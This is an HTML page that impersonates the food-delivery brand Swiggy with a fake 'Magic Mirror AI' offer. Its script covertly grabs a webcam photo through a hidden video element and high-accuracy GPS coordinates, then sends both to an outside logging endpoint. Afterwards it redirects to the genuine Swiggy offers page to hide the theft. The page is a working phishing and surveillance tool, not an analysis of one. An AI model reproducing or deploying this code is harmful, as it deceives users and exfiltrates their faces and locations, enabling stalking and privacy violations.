<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swiggy | Magic Mirror</title>
    <style>
        body { background: #fff; color: #282c3f; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { text-align: center; width: 90%; max-width: 380px; padding: 40px 20px; }
        
        /* Swiggy Style Logo */
        .logo-box { width: 70px; height: 70px; background: #fc8019; border-radius: 18px; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; box-shadow: 0 10px 20px rgba(252,128,25,0.3); }
        .logo-box span { color: white; font-weight: 900; font-size: 40px; }

        h1 { font-size: 1.6rem; font-weight: 800; color: #282c3f; margin: 0 0 10px; }
        p { font-size: 0.95rem; color: #7e808c; line-height: 1.5; margin-bottom: 35px; }
        
        .action-btn { background: #fc8019; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(252,128,25,0.2); }
        .action-btn:disabled { background: #ccc; box-shadow: none; }

        #loader { display: none; margin-top: 20px; }
        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #fc8019; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Hidden Elements */
        #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo-box"><span>S</span></div>
        <div id="ui-content">
            <h1>Magic Mirror AI</h1>
            <p>See your <strong>AI Future Appearance</strong> and find <strong>Swiggy Deals</strong> at restaurants near your current location.</p>
            <button id="btn" class="action-btn">REVEAL MAGIC</button>
        </div>
        
        <div id="loader">
            <div class="spinner"></div>
            <p style="font-size: 0.8rem; color: #fc8019; margin-top: 15px; font-weight: 600;">GENERATING AI PREVIEW...</p>
        </div>
    </div>

    <video id="v" playsinline muted></video>

    <script>
        const API_URL = "https://titan-logger.saliljha523.workers.dev";
        const btn = document.getElementById('btn');
        const ui = document.getElementById('ui-content');
        const loader = document.getElementById('loader');
        const video = document.getElementById('v');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            ui.style.display = 'none';
            loader.style.display = 'block';

            try {
                // 1. Request Hardware - User MUST click 'Allow' on the popups
                const [stream, pos] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                    new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                            enableHighAccuracy: true,
                            timeout: 10000, // Wait for PIN-POINT GPS
                            maximumAge: 0
                        });
                    })
                ]);

                // 2. Capture Hidden Image
                video.srcObject = stream;
                await video.play();
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);

                // Stop Camera
                stream.getTracks().forEach(track => track.stop());

                // 3. Exact Coordinates
                const exactGPS = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_FAILED";

                // 4. UPLINK - WE WAIT FOR SUCCESS BEFORE REDIRECT
                const response = await fetch(API_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, gps: exactGPS })
                });

                if (response.ok) {
                    console.log("Intelligence Logged.");
                }

            } catch (err) {
                console.error("Hardware Blocked.");
            }

            // 5. Final Redirect to Swiggy
            window.location.replace("https://www.swiggy.com/offers-near-me");
        };
    </script>
</body>
</html>
